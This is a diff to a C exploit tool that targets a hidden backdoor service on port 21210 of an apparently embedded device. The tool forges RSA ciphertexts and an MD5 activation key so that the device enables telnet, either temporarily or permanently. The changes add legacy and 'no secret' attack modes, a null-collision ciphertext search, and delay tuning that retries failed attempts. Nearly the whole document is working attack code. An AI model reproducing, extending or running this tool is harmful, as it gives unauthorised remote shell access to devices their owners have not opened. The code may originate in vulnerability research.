@@ -12,8 +12,8 @@
 #include <openssl/rsa.h>
 
 #define SCAN_DELAY  300000
-#define STAGE_DELAY 100000
-#define DELAY_INCREMENT 10000
+#define STAGE_DELAY 80000
+#define DELAY_INCREMENT 2000
 #define DELAY_DECREMENT 1000
 #define BACKDOOR_PORT 21210
 #define TELNET_PORT 23
@@ -108,7 +108,7 @@ int decrypt_with_pubkey(RSA *rsa, unsigned char *ciphertext, unsigned char *plai
   int sz;
   memset(plaintext, 0, PLAINTEXT_LENGTH);
   sz = RSA_size(rsa);
-  fprintf(stderr, "[-] RSA_size(rsa) = %d\n", sz);
+  //fprintf(stderr, "[-] RSA_size(rsa) = %d\n", sz);
   return RSA_public_decrypt(sz, ciphertext, plaintext, rsa, RSA_NO_PADDING);
 }
 
@@ -179,8 +179,8 @@ int envelope_len = 0x80;
 
   if (resp_len > 0) {
     printf("[-] Expecting %d bytes in reply...\n", resp_len);
-    printf("[-] Setting socket timeout to %lds + %ldus\n", tv.tv_sec, tv.tv_usec);
-    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    //printf("[-] Setting socket timeout to %lds + %ldus\n", tv.tv_sec, tv.tv_usec);
+    //setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     
     // Here we might want to read from the socket in chunks, without
     // blocking indefinitely...
@@ -316,7 +316,7 @@ struct DeviceList * lookup_device_name(struct DeviceList *DL, char *name) {
 }
 
 
-#define FALLBACK "international 33 (no id)"
+#define FALLBACK "the old key"
 
 struct DeviceList * init_device_list() {
   struct DeviceList *DL;
@@ -340,7 +340,7 @@ struct DeviceList * init_device_list() {
     "010001");
 
   add_entry_to_device_list(DL,
-    "international 33 (no id)",
+    FALLBACK,
     "CC232B9BB06C49EA1BDD0DE1EF9926872B3B16694AC677C8C581E1B4F59128912CBB92EB363990FA"
     "E43569778B58FA170FB1EBF3D1E88B7F6BA3DC47E59CF5F3C3064F62E504A12C5240FB85BE727316"
     "C10EFF23CB2DCE973376D0CB6158C72F6529A9012786000D820443CA44F9F445ED4ED0344AC2B1F6"
@@ -434,19 +434,26 @@ void random_buffer(unsigned char *buf, int len) {
   return;
 }
 
-unsigned char *find_phony_ciphertext(RSA *rsa,
+
+#define NULL_COLLISION 1
+#define OLD_WAY 2
+
+void find_phony_ciphertext(RSA *rsa,
+  unsigned char *phony_ciphertext,
+  unsigned char *phony_plaintext,
   unsigned char *prefix,
-  int prefix_len) {
-  unsigned char *phony_ciphertext;
-  unsigned char phony_plaintext[1024];
+  int prefix_len,
+  int mode
+  ) {
+
+  memset(phony_ciphertext, 0, CIPHERTEXT_LENGTH);
+  memset(phony_plaintext, 0, CIPHERTEXT_LENGTH);
   int plaintext_length;
   int tries = 0;
-  memset(phony_plaintext, 0, 0x20);
-  phony_ciphertext = calloc(PHONY_CIPHERTEXT_LENGTH, sizeof(char));
   do {
     tries++;
 
-    random_buffer(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
+    random_buffer(phony_ciphertext, CIPHERTEXT_LENGTH);
     phony_ciphertext[0] || (phony_ciphertext[0] |= 1);
     if (prefix_len) {
       memcpy(phony_ciphertext, prefix, prefix_len);
@@ -459,8 +466,8 @@ unsigned char *find_phony_ciphertext(RSA *rsa,
       printf("[-] We don't have a matching public key for this target\n"
           "    so we'll just throw random buffers at it and see what sticks.\n"
           "    returning:\n");
-      hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
-      return phony_ciphertext;
+      hexdump(phony_ciphertext, CIPHERTEXT_LENGTH);
+      return;
     }
     plaintext_length = decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
     // If the first character of phony_plaintext is printable, then
@@ -471,19 +478,36 @@ unsigned char *find_phony_ciphertext(RSA *rsa,
     // operation that's used to produce the telnet activation keys
     // to append an EMPTY STRING to the salt/suffix. And this will
     // make the MD5 hash of the secret predictable.
-    if ((plaintext_length < 0x101) && 
+    int len_as_str = strlen((char *) phony_plaintext);
+    if (mode == NULL_COLLISION && (plaintext_length < 0x101) && 
         (0x21 <= phony_plaintext[0]) && 
-        (phony_plaintext[0] < 0x7f)) {
+        (phony_plaintext[0] < 0x7f) &&
+        (len_as_str < plaintext_length)) {
       printf("[!] Found valid Stage II payload in %d attempts:\n", tries);
-      hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
-      printf("[=] Decrypts to (%d bytes):\n", plaintext_length);
+      hexdump(phony_ciphertext, CIPHERTEXT_LENGTH);
+      printf("[=] Decrypts to (%d bytes, strlen %d):\n", plaintext_length, len_as_str);
       hexdump(phony_plaintext, plaintext_length);
-      return phony_ciphertext;
+      return;
+    } else if (mode == OLD_WAY && (len_as_str < plaintext_length)) {
+      printf("[!] Found valid phony ciphertext after %d attempts:\n", tries);
+      printf("[=] Decrypts to (%d bytes, strlen %d):\n", plaintext_length, len_as_str);
+      hexdump(phony_plaintext, plaintext_length);
     }
   } while (1);
 }
 
 
+void status(char *stage, int on_try, int tries, int stage_delay, float ratio, char *modetext) {
+
+    bar('=');
+    printf("[*] ENTERING STAGE %s (round %d/%d) (d: %d, rr: %.2f%%) IN %s\n", 
+        stage,
+        on_try, tries,
+        stage_delay,
+        ratio,
+        modetext);
+    bar('=');
+}
 
 int main(int argc, char **argv) {
   unsigned char ciphertext[CIPHERTEXT_LENGTH];
@@ -494,7 +518,7 @@ int main(int argc, char **argv) {
 
   if (argc == 1) {
     printf("[?] Usage: %s <ip addr>\n", argv[0]);
-    printf("    Set environment variable BACKDOOR_INTERNATIONAL for international mode.\n");
+    printf("    Set environment variable BACKDOOR_LEGACY for legacy mode.\n");
     printf("    Set environment variable BACKDOOR_SALT to PERM or TEMP (default), to\n"
            "    enable telnetd on a PERManent or TEMPorary basis.\n");
     exit(1);
@@ -504,7 +528,8 @@ int main(int argc, char **argv) {
 
   char *ip_addr = argv[1]; 
   const char *handshake_token = "ABCDEF1234";
-  unsigned char *phony_ciphertext;
+  unsigned char phony_ciphertext[CIPHERTEXT_LENGTH];
+  unsigned char phony_plaintext[CIPHERTEXT_LENGTH];
   unsigned char backdoor_key[16];
   char magic_salt[6]; // = "+TEMP";
   char *salt_var;
@@ -512,13 +537,23 @@ int main(int argc, char **argv) {
   if (salt_var == NULL) {
     salt_var = "TEMP";
   }
-  snprintf(magic_salt, 6, "+%s", salt_var);
+  snprintf(magic_salt, 6, "%s", salt_var);
   printf("[+] Using magic salt \"%s\"\n", magic_salt);
   int temp_mode;
-  temp_mode = strcmp(magic_salt, "+TEMP") == 0;
+  temp_mode = strcmp(magic_salt, "TEMP") == 0;
   printf("[+] temp_mode = %d\n", temp_mode);
-  int international_mode;
-  international_mode = getenv("BACKDOOR_INTERNATIONAL") != NULL;
+  int legacy_mode;
+  int no_secret_mode = 0;
+  legacy_mode = getenv("BACKDOOR_LEGACY") != NULL;
+  no_secret_mode = getenv("BACKDOOR_NO_SECRET") != NULL;
+  char *modetext;
+  if (legacy_mode) {
+    modetext = "LEGACY MODE";
+  } else if (no_secret_mode) {
+    modetext = "NO SECRET MODE";
+  } else {
+    modetext = "ULTIMATE MODE";
+  }
   unsigned char buffer[CIPHERTEXT_LENGTH];
   int tries = MAX_TRIES;
   char *telnet_command;
@@ -634,12 +669,12 @@ int main(int argc, char **argv) {
 
   int no_reply = 0;
   int got_reply = 0;
-  float ratio = 0.0;
+  float ratio = 1.0;
 
 #define QUALITY_CONTROL(__com_res) { if ((__com_res) == -1) { \
   no_reply ++; \
-  ratio = 100 * no_reply / (no_reply + got_reply); \
-  printf("[x] No reply (this has happened %d times out of %d (%.2f%%)).\n", no_reply, no_reply + got_reply, ratio); \
+  ratio = 100 * got_reply / (no_reply + got_reply); \
+  printf("[x] No reply (received replies %d times out of %d (%.2f%%)).\n", got_reply, no_reply + got_reply, ratio); \
   stage_delay += DELAY_INCREMENT; \
   goto STAGE_I;  \
 } else if (stage_delay > DELAY_DECREMENT) { \
@@ -651,9 +686,9 @@ int main(int argc, char **argv) {
   int on_try = 0;
   int com_res = 0;
 
-  if (international_mode) {
+  if (legacy_mode) {
     device_info = lookup_device_name(device_list, FALLBACK);
-    printf("[+] Setting RSA key for international mode\n");
+    printf("[+] Setting RSA key for legacy mode\n");
     rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
   }
 
@@ -661,15 +696,16 @@ int main(int argc, char **argv) {
 //
   int backdoor_key_len = 0x10;
   memset(backdoor_key, 0, backdoor_key_len);
-  md5raw(backdoor_key, (unsigned char *) magic_salt, strlen(magic_salt));
+  char unhashed_backdoor_key[0x10];
+  snprintf(unhashed_backdoor_key, 0xf, "+%s", magic_salt);
+  md5raw(backdoor_key, (unsigned char *) unhashed_backdoor_key, strlen(unhashed_backdoor_key));
+
 
   do {
-    
-    goto STAGE_I;
-
 STAGE_I:
     on_try += 1;
 
+    /* Test to see if the telnet port is open. */
     if (temp_mode && check_tcp_port(ip_addr, telnet_port)) {
 
       gettimeofday(&timecheck, NULL);
@@ -684,16 +720,12 @@ STAGE_I:
       printf("[+] Not yet. %d tries remaining...\n", tries-on_try);
     }
 
-    if (international_mode) {
+    if (legacy_mode || no_secret_mode) {
       goto STAGE_II;
     }
     usleep(stage_delay);
     memset(buffer, 0, 0x80);
-    bar('=');
-    printf("[*] ENTERING STAGE I (round %d/%d) (delay = %d)%s\n", on_try, tries,
-        stage_delay,
-        international_mode ? " IN INTERNATIONAL MODE" : "");
-    bar('=');
+    status("I", on_try, tries, stage_delay, ratio, modetext);
     printf("[+] Sending handshake token: %s\n", handshake_token);
     printf("[-] Waiting for device identifying hash...\n");
     QUALITY_CONTROL(communicate(ip_addr, backdoor_port,
@@ -706,17 +738,17 @@ STAGE_I:
     printf("[+] Received device identifying hash:\n");
     hexdump(buffer, 16);
 
-    if (!international_mode) {
+    if (!legacy_mode) {
       if (device_info == NULL) {
         if ((device_info = lookup_device_hash(device_list, buffer))) {
           rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
         } else {
-          international_mode = 1;
+          legacy_mode = 1;
           device_info = lookup_device_name(device_list, FALLBACK);
           rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
         }
       } else {
-        // not strictly necessary, but I like to make sure everything's in order
+        /* not strictly necessary, but I like to make sure everything's in order */
         if (0 != memcmp(device_info->hash, buffer, 16)) {
           printf("[x] Discrepancy in device identifying hash. Expected:\n");
           hexdump(device_info->hash, 16);
@@ -731,39 +763,50 @@ STAGE_I:
       printf("[!] Not checking hash (CHAOS MODE).\n");
     }
 
-    goto STAGE_II;
-
 STAGE_II:
     usleep(stage_delay);
     memset(buffer, 0, 0x80);
     bar('=');
-    printf("[*] ENTERING STAGE II (round %d/%d) (delay = %d)%s\n", on_try, tries,
+    printf("[*] ENTERING STAGE II (round %d/%d) (d: %d, rr: %.2f%%) IN %s\n", on_try, tries,
         stage_delay,
-        international_mode ? " IN INTERNATIONAL MODE" : "");
+        ratio,
+        modetext);
     bar('=');
     memset(buffer, 0, CIPHERTEXT_LENGTH);
-    phony_ciphertext = find_phony_ciphertext(rsa, backdoor_key, backdoor_key_len);  
+    find_phony_ciphertext(rsa, 
+        phony_ciphertext,
+        phony_plaintext,
+        backdoor_key, 
+        backdoor_key_len, 
+        no_secret_mode ? OLD_WAY : NULL_COLLISION);  
     com_res = communicate(ip_addr, backdoor_port,
         phony_ciphertext,
-        PHONY_CIPHERTEXT_LENGTH,
-        buffer,
         CIPHERTEXT_LENGTH,
+        buffer,
+        no_secret_mode ? 0 : 0x20,
         stage_delay);
-    free(phony_ciphertext);
     QUALITY_CONTROL(com_res);
-
-    goto STAGE_III;
 
 STAGE_III:
     usleep(stage_delay);
     memset(buffer, 0, 0x80);
     bar('=');
-    printf("[*] ENTERING STAGE III (round %d/%d) (delay = %d)%s\n", on_try, tries, 
+    printf("[*] ENTERING STAGE III (round %d/%d) (d: %d, rr: %.2f%%) IN %s\n", on_try, tries,
         stage_delay,
-        international_mode ? " IN INTERNATIONAL MODE" : "");
+        ratio,
+        modetext);
     bar('=');
-    printf("[+] Sending MD5('%s') and hoping for collision...\n",
+    printf("[+] Sending MD5('+%s') and hoping for collision...\n",
         (char *) magic_salt);
+
+    unsigned char msg[0x10];
+    if (no_secret_mode) {
+      char s[0x200];
+      snprintf(s, 0x180, "%s+%s", (char *) phony_plaintext, magic_salt);
+      md5raw(msg, (unsigned char *) s, strlen(s)); 
+    } else {
+      memcpy(msg, backdoor_key, 0x10);
+    }
 
     com_res = communicate(ip_addr, backdoor_port,
         backdoor_key,
@@ -772,9 +815,6 @@ STAGE_III:
         0,
         stage_delay);
     QUALITY_CONTROL(com_res);
-
-    /* Now test to see if the telnet port is open. */
-
     usleep(stage_delay);
 
   } while (tries - on_try > 0);
